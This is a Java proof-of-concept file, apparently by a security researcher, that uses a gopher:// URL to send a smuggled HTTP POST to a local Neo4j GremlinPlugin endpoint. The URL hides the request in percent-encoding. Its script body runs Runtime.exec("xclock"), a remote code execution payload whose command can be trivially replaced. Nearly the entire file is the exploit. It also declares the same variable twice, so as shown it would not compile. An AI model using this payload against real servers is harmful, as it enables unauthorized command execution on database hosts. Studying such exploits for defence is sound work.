/**
 * Created by pwntester on 2/14/14.
 */

import java.net.*;
import java.io.*;

public class GopherClient {
    public static void main(String[] args) throws Exception {

        String url_string = "gopher://localhost:7474/1%50%4f%53%54%20%2f%64%62%2f%64%61%74%61%2f%65%78%74%2f%47%72%65%6d%6c%69%6e%50%6c%75%67%69%6e%2f%67%72%61%70%68%64%62%2f%65%78%65%63%75%74%65%5f%73%63%72%69%70%74%20%48%54%54%50%2f%31%2e%31%0d%0a%48%6f%73%74%3a%20%6c%6f%63%61%6c%68%6f%73%74%3a%37%34%37%34%0d%0a%43%6f%6e%74%65%6e%74%2d%54%79%70%65%3a%20%61%70%70%6c%69%63%61%74%69%6f%6e%2f%6a%73%6f%6e%0d%0a%43%6f%6e%74%65%6e%74%2d%4c%65%6e%67%74%68%3a%20%39%35%0d%0a%0d%0a%7b%22%73%63%72%69%70%74%22%3a%22%69%6d%70%6f%72%74%20%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%3b%72%74%20%3d%20%52%75%6e%74%69%6d%65%2e%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%5c%22%78%63%6c%6f%63%6b%5c%22%29%22%2c%20%22%70%61%72%61%6d%73%22%3a%20%7b%7d%20%7d%0d%0a%0d%0a";

        String url_string = "gopher://localhost:7474/1%50%4f%53%54%20%2f%64%62%2f%64%61%74%61%2f%65%78%74%2f%47%72%65%6d%6c%69%6e%50%6c%75%67%69%6e%2f%67%72%61%70%68%64%62%2f%65%78%65%63%75%74%65%5f%73%63%72%69%70%74%20%48%54%54%50%2f%31%2e%31%0d%0a%48%6f%73%74%3a%20%6c%6f%63%61%6c%68%6f%73%74%3a%37%34%37%34%0d%0a%43%6f%6e%74%65%6e%74%2d%54%79%70%65%3a%20%61%70%70%6c%69%63%61%74%69%6f%6e%2f%6a%73%6f%6e%0d%0a%43%6f%6e%74%65%6e%74%2d%4c%65%6e%67%74%68%3a%20%39%35%0d%0a%0d%0a%7b%22%73%63%72%69%70%74%22%3a%22%69%6d%70%6f%72%74%20%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%3b%72%74%20%3d%20%52%75%6e%74%69%6d%65%2e%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%5c%22%78%63%6c%6f%63%6b%5c%22%29%22%2c%20%22%70%61%72%61%6d%73%22%3a%20%7b%7d%20%7d%0d%0a%0d%0a";

        URL url = new URL(url_string);
        URLConnection yc = url.openConnection();
        BufferedReader in = new BufferedReader(new InputStreamReader(
                yc.getInputStream()));
        String inputLine;
        while ((inputLine = in.readLine()) != null)
            System.out.println(inputLine);
        in.close();
    }
}